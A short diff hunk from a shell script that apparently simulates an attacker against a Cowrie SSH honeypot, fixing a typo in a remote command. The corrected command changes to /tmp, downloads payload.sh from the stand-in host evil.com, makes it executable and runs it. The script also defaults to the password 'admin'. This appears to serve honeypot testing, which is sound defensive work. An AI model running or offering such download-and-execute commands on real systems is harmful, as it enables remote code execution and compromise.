@@ -44,7 +44,7 @@ else
   PASS="admin"
 fi
 
-REMOTE_CMD='cd /tmp; wget bhttp://evil.com/payload.sh; chmod +x payload.sh; sh payload.sh'
+REMOTE_CMD='cd /tmp; wget http://evil.com/payload.sh; chmod +x payload.sh; sh payload.sh'
 
 say "[*] SSH vào Cowrie & chạy payload (wget) ..."
 set +e
